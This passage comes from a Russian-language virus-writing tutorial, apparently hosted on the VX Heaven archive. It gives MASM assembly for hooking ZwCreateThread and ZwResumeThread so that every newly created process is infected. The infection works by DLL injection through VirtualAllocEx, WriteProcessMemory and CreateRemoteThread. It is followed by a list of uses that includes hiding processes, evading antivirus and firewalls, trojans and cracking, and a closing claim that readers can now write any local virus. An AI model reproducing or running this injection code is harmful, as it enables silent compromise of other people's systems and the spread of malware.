&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;UserStack<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> CreateSuspended<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; startproc<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>AddrCreateThread<span style="color: #339933;">,</span>offset Old_Code2<span style="color: #339933;">,</span>\<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;size_code2<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;снятие перехвата</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> TRUE<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> UserStack<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ThreadContext<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ClientId<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ProcessHandle<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ObjectAttributes<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> DesiredAccess<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ThreadHandle1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> AddrCreateThread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>CurrProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span>ClientId<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">:</span>PTR CLIENTID<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>!=<span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>UniqueProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> NewProcess<span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if CreateSuspended==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke ResumeThread<span style="color: #339933;">,</span>ThreadHandle1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>AddrCreateThread<span style="color: #339933;">,</span>offset code2<span style="color: #339933;">,</span>\<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;size_code2<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;установка перехвата</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; endproc<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
NewZwCreateThread endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Теперь нам надо перехватить ZwResumeThread. Вот ее прототип:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">ZwResumeThread proc ThreadHandle1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> PriviousSuspendCount<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span></div>
<p>Как видите нам передается описатель потока, работа которого возобновляется. Нам необходимо получить id процесса, которому принадлежит этот поток. Если этот id отличается от нашего id'а и установлен флаг NewProcess, то заражаем процесс. Id процесса по описателю потока можно получить с помощью функции NtQueryInformationThread. Вот ее прототип:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">ZwQueryInformationThread proc ThreadHandle<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span>ThreadInformationClass<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span>\<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ThreadInformation<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span>ThreadInformationLength<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ReturnLength<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span></div>
<ul>
	<li>ThreadHandle - описатель потока, о котором мы хотим узнать информацию.</li>
	<li>ThreadInformation - указатель на структуру THREAD_BASIC_INFORMATION в случае ThreadInformationLength равным 0. Структура THREAD_BASIC_INFORMATION определена так:
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">THREAD_BASIC_INFORMATION struct<br />
&nbsp; &nbsp; &nbsp; &nbsp; ExitSTatus&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; TebBaseAddress&nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; ClientId&nbsp; &nbsp; &nbsp; &nbsp; CLIENTID &lt;<span style="color: #ff0000;">0</span>&gt;<br />
&nbsp; &nbsp; &nbsp; &nbsp; AffinityMask&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; Priority&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; BasePriority&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> <span style="color: #ff0000;">0</span><br />
THREAD_BASIC_INFORMATION ends</div></li>
</ul>
<p>Из вложенной структуры ClientId мы узнаем id процесса, которому принадлежит поток, т.к. при вызове функции ZwQueryInformationThread заполняется структура THREAD_BASIC_INFORMATION.</p>
<p>А вот исходный код обработчика ZwResumeThread:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">NewZwResumeThread proc ThreadHandle1<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> PriviousSuspendCount<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
LOCAL ThreadInfo<span style="color: #339933;">:</span>THREAD_BASIC_INFORMATION<br />
LOCAL hProcess<span style="color: #339933;">:</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; startproc<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>AddrResumeThread<span style="color: #339933;">,</span>offset Old_Code3<span style="color: #339933;">,</span>size_code3<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;снятие перехвата</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset nt <br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset QueryInfoStr<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">28</span><span style="color: black; font-style: italic;">;sizeof THread Basic information</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>ThreadInfo<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;ThreadBasicInfo</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ThreadHandle1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black; font-style: italic;">;Вызов NtQueryInformationThread для получения id процесса из хэндла треда</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span>ThreadInfo<span style="color: #339933;">.</span>ClientId<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">:</span>PTR CLIENTID<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>UniqueProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if <span style="color: #46aa03; font-weight: bold;">eax</span>!=CurrProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>if NewProcess==<span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;заражаем новый процесс</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke OpenProcess<span style="color: #339933;">,</span>PROCESS_CREATE_THREAD <span style="color: #00007f; font-weight: bold;">or</span> PROCESS_VM_WRITE <span style="color: #00007f; font-weight: bold;">or</span> \<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PROCESS_VM_OPERATION<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black; font-style: italic;">;Открываем процесс куда будем внедрять DLL</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> hProcess<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получаем описатель модуля Kernel32.dll</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke GetModuleHandle<span style="color: #339933;">,</span>offset kern<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Получаем адрес функции LoadLibrary</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke GetProcAddress<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset loadlibraryName<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> _LoadLibrary<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke VirtualAllocEx<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>dwSize<span style="color: #339933;">,</span>MEM_RESERVE <span style="color: #00007f; font-weight: bold;">or</span> MEM_COMMIT<span style="color: #339933;">,</span>\<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PAGE_READWRITE<span style="color: black; font-style: italic;">;Выделяем память в удаленном процессе</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> ParameterForLoadLibrary<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Запись строки с именем DLL в АП чужого процесса</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset lib<span style="color: #339933;">,</span>dwSize<span style="color: #339933;">,</span>NULL<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Создаем удаленный поток, который вызывает LoadLibrary, </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;тем самым внедряем DLL в адресное пространство чужого процесса. &nbsp;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CreateRemoteThread<span style="color: #339933;">,</span>hProcess<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>_LoadLibrary<span style="color: #339933;">,</span>\<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ParameterForLoadLibrary<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>offset ThreadId<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>hProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> NewProcess<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif <br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>endif<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> PriviousSuspendCount<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> ThreadHandle1<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> AddrResumeThread<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke GetCurrentProcess<br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke WriteProcessMemory<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>AddrResumeThread<span style="color: #339933;">,</span>offset code3<span style="color: #339933;">,</span>size_code3<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: black; font-style: italic;">;установка перехвата</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; endproc<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
NewZwResumeThread endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>В архиве прилагаемой к статье в папке GlobalHooking находиться программа и ее исходный код, где перехватывается MessageBoxA и MessageBoxW во всех текущих процессах и в новых.</p>
<h2><a name="c5"></a>Примеры использования перехвата вызовов функций</h2>
<p>Вот список, где можно использовать перехват вызовов функций. Но он конечно не исчерпывающий.</p>
<ul>
	<li>Брандмауэр</li>
	<li>Контроль сетевого трафика</li>
	<li>Скрытие файлов</li>
	<li>Скрытие сетевых соединений</li>
	<li>Скрытие процессов</li>
	<li>Продвинутое заражение</li>
	<li>Обход брандмауэра</li>
	<li>Обход антивируса</li>
	<li>Эмуляция другой ОС</li>
	<li>Взлом программ</li>
	<li>Троянские программы</li>
</ul>
<h2><a name="c6"></a>Использованные источники и источники для дальнейших исследований</h2>
<h3><a name="c61"></a>SEH и VEH</h3>
<ol>
	<li>A Crash Course on the Depths of Win32 Structured Exception Handling [Matt Pietrek] <a href="http://www.microsoft.com/">http://www.microsoft.com</a></li>
	<li>Обработка исключений Win32 для программистов на ассемблере [Jeremy Gordon] <a href="http://www.wasm.ru/">http://www.wasm.ru</a></li>
	<li>SEH(Structured Exception Handling) на службе контрреволюции [Крис Касперски] <a href="http://www.insidepro.com/">http://www.insidepro.com</a></li>
	<li>Эксплуатирование SEH в среде Win32. Часть первая. [houseofdabus] <a href="http://www.securitylab.ru/">http://www.securitylab.ru</a></li>
	<li>New Vectored Exception Handling in Windows XP [Matt Pietrek] <a href="http://www.microsoft.com/">http://www.microsoft.com</a></li>
	<li>Централизованная обработка исключений [Беляев Алексей] <a href="http://www.rsdn.ru/">http://www.rsdn.ru</a></li>
</ol>
<h3><a name="c62"></a>Windows File Protection</h3>
<ol>
	<li>Windows File Protection: How To Disable It On The Fly [Ntoskrnl] <a href="http://www.rootkit.com/">http://www.rootkit.com</a></li>
</ol>
<h3><a name="c63"></a>API Hooking</h3>
<ol>
	<li>Перехват API функций в Windows NT (часть 1). Основы перехвата. [Ms-Rem] <a href="http://www.wasm.ru/">http://www.wasm.ru</a></li>
	<li>Перехват API функций в Windows NT (часть 2). Методы внедрения кода. [Ms-Rem] <a href="http://www.wasm.ru/">http://www.wasm.ru</a></li>
	<li>Система перехвата функций API платформы Win32 [90210 / HI-TECH] <a href="http://www.wasm.ru/">http://www.wasm.ru</a></li>
	<li>API hooking revealed [Ivo Ivanov] <a href="http://lib.training.ru/Lib/ArticleDetail.aspx?ar=1596&amp;l=&amp;mi=105&amp;mic=352">http://lib.training.ru/Lib/ArticleDetail.aspx?ar=1596&amp;l=&amp;mi=105&amp;mic=352</a></li>
	<li>API Spying [Сергей Холодилов] <a href="http://www.rsdn.ru/">http://www.rsdn.ru</a></li>
	<li>API Spying Techniques for Windows 9x, NT and 2000 [Yariv Kaplan] <a href="http://www.internals.com/articles/apispy/apispy.htm">http://www.internals.com/articles/apispy/apispy.htm</a></li>
	<li>HOWTO: Вызов функции в другом процессе [Сергей Холодилов] <a href="http://www.rsdn.ru/">http://www.rsdn.ru</a></li>
	<li>Перехват API-функций в Windows NT/2000/XP [Тихомиров В.А.] <a href="http://www.rsdn.ru/">http://www.rsdn.ru</a></li>
	<li>Перехват данных Internet Explorer [Matt Pietrek] <a href="http://www.codenet.ru/progr/visualc/ie.php">http://www.codenet.ru/progr/visualc/ie.php</a></li>
	<li><a href="/lib/vbu00.html">Per-process residency review: common mistakes</a> [Bumblebee / 29A] <a href="http://vx.netlux.org/">http://vx.netlux.org</a></li>
	<li>Hooking Windows API - Technics of hooking API functions on Windows [Holy Father] <a href="http://www.assembly-journal.com/">http://www.Assembly-Journal.com</a></li>
</ol>
<h2><a name="c7"></a>Заключение</h2>
<p>В этой главе мы рассмотрели несколько очень важных техник, без которых далеко не уйдешь. Они используются не только при программировании вирусов, но и вообще в системном программировании. Теперь используя полученный материал, Вы можете программировать любые локальные вирусы. Я понимаю, что этот материал нельзя освоить за один наскок, но Вы должны стараться. Во всяком случае, Вы будете приближаться к истинному пониманию работы ОС Windows, ее идеологии, подводных камнях и т.д. И наша задача заключается именно в понимании тонкостей работы ОС Windows. Я надеюсь, что не будете никому вредить, используя полученные знания. Я категорически против деструкции в вирусах. Лучше напрягитесь и сделайте какую-нибудь красивую или оригинальную полезную нагрузку, чтобы <em>юзверь</em> упал со стула от удивления, например, когда его компьютер начнет пукать :)</p>
<p>Если у Вас есть замечания по статье или вопросы, то свяжитесь со мной по адресу <a href="/cdn-cgi/l/email-protection#52101b1e1e0d06021d11121f131b1e7c0007"><span class="__cf_email__" data-cfemail="84c6cdc8c8dbd0d4cbc7c4c9c5cdc8aad6d1">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a>.</p>
<h2><a name="c8"></a>The Passion Of Code (TPOC) Laboratory</h2>
<p>Я представляю лабораторию The Passion Of Code (TPOC) и заявляю: если у Вас есть желание вникать в тонкости ОС и Вы уже что-то умеете, то я прошу Вас связаться со мной по адресу <a href="/cdn-cgi/l/email-protection#7032393c3c2f24203f33303d31393c5e2225"><span class="__cf_email__" data-cfemail="adefe4e1e1f2f9fde2eeede0ece4e183fff8">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a>. Но не беспокойте пожалуйста меня те люди, которых надо подгонять что-то делать - у Вас должен быть свой энтузиазм. Сайт нашей лаборатории http://tpoc.h15.ru.</p>
<h2><a name="c9"></a>Спасибо...</h2>
<p>DayDream, BlackFox, _follower / TPOC, FreeMan / TPOC</p>
<p>Также хотел бы сказать спасибо Ms-Rem за его замечательную статью "Перехват API функций в Windows NT (часть 2). Методы внедрения кода"</p>
<p><a href="files/vbp01/files3.rar">Файлы к статье</a></p>
[<a style="" href="/lib/?lang=RU&amp;index=WI#vbp01">Вернуться к списку</a>] [<a href="/lib/vbp01.html#disqus_thread">Комментарии</a>]<br />    <div id="disqus_thread"></div>
    <script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>



</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vbp01">de</a><a href="/lib/index.php?lang=en&amp;id=vbp01">en</a><a href="/lib/index.php?lang=es&amp;id=vbp01">es</a><a href="/lib/index.php?lang=it&amp;id=vbp01">it</a><a href="/lib/index.php?lang=fr&amp;id=vbp01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vbp01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vbp01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vbp01">ua</a></div>
<script>/* <![CDATA[ */(function(d,s,a,i,j,r,l,m,t){try{l=d.getElementsByTagName('a');t=d.createElement('textarea');for(i=0;l.length-i;i++){try{a=l[i].href;s=a.indexOf('/cdn-cgi/l/email-protection');m=a.length;if(a&&s>-1&&m>28){j=28+s;s='';if(j<m){r='0x'+a.substr(j,2)|0;for(j+=2;j<m&&a.charAt(j)!='X';j+=2)s+='%'+('0'+('0x'+a.substr(j,2)^r).toString(16)).slice(-2);j++;s=decodeURIComponent(s)+a.substr(j,m-j)}t.innerHTML=s.replace(/</g,'&lt;').replace(/\>/g,'&gt;');l[i].href='mailto:'+t.value}}catch(e){}}}catch(e){}})(document);/* ]]> */</script></body>
</html>
